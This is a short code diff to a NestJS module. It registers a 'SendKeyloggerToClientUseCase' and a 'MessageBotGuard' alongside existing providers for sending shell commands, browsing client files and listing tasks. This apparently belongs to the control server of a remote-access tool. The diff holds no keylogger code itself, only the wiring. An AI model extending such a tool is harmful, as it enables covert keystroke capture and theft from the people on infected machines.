@@ -22,6 +22,8 @@ import { GetTasksUseCase } from "./application/events/get-tasks.use-case";
 import { ControllerRoutes } from "./infrastructure/routes/controller-routes.controller";
 import { ControllerEvents } from "./infrastructure/routes/controller-events.controller";
 import { RedisServiceModule } from "@/src/repository/redis/redis.module";
+import { SendKeyloggerToClientUseCase } from "./application/events/send-keylogger.use-case";
+import { MessageBotGuard } from "./application/guards/MessageBot.guard";
 
 @Module({
   controllers: [ControllerRoutes, ControllerEvents],
@@ -36,6 +38,8 @@ import { RedisServiceModule } from "@/src/repository/redis/redis.module";
     SendCmdCommandToClientUseCase,
     GetExplorerClientUseCase,
     GetTasksUseCase,
+    SendKeyloggerToClientUseCase,
+    MessageBotGuard,
   ],
   imports: [
     SharedModule,
